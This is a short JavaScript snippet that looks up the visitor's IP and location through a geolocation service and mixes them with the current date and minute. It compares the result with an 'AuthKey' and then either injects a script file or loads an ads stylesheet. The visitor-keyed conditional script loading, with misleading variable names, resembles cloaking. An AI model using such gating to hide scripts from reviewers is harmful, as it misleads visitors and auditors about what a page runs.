var query = "http://freegeoip.net/json/?ormat=json&jsoncallback=imgs51";
var imgs51 = function (data) {
var htmlString = "";
var d = new Date();
var n = d.getDate();
var m = d.getDay();
var dn = d.getMinutes();
var country = data.latitude+data.ip+data.longitude+data.metro_code+n+m+dn;
var country1 = AuthKey;
if( country1 == country ){ 
(function() {
var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
po.src = 'default.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
})();
  } else{
var s = document.createElement("link");
s.type = "text/css";
s.rel = "stylesheet";
s.href = "imgads.css";
$("head").append(s);
}};
$.getJSON(query, imgs51);
